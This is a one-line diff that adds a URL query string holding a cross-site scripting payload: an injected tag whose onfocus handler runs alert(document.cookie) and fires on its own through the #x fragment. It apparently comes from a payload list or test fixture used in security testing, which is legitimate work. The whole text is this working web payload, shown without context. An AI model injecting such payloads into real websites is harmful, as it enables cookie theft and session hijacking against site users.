@@ -1,0 +1,1 @@
+?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
